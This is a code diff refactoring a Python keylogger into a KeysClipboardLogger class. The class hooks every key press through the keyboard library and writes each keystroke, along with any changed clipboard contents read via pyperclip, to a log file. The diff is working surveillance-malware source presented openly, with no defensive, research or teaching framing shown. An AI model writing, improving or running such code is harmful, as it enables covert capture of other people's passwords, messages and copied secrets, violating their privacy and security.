@@ -9,8 +9,6 @@
 import keyboard as kb
 import pyperclip as pc
 
-old_clipboard = None
-
 
 # Main code here
 def event_to_string(event):
@@ -30,22 +28,26 @@ def event_to_string(event):
     return string
 
 
-def start_keylogger(text_file):
-    def on_press(event):
-        text_file.write(event_to_string(event))
-    kb.on_press(on_press)
+class KeysClipboardLogger:
+    def __init__(self, file):
+        self.old_clipboard = None
+        self.current_clipboard = None
+        self.logged_keys = 0
+        self.working_file = file
 
+        self.start_keylogger()
 
-def stop_keylogger():
-    kb.unhook_all()  # Despite this function being only 1 line, might be handy in case of future add-ons.
+    def log_clipboard(self):
+        self.current_clipboard = pc.paste()
+        if self.current_clipboard != self.old_clipboard:
+            self.working_file.write(f" [CLIPBOARD DATA: {self.current_clipboard}] ")
+            self.old_clipboard = self.current_clipboard
 
+    def start_keylogger(self):
+        def on_press(event):
+            self.working_file.write(event_to_string(event))
 
-def log_clipboard(text_file):
-    global old_clipboard
-    current_clipboard = pc.paste()
-    if current_clipboard != old_clipboard:
-        text_file.write(f" [CLIPBOARD DATA: {current_clipboard}] ")
-        old_clipboard = current_clipboard
+        kb.on_press(on_press)
 
 
 def main():
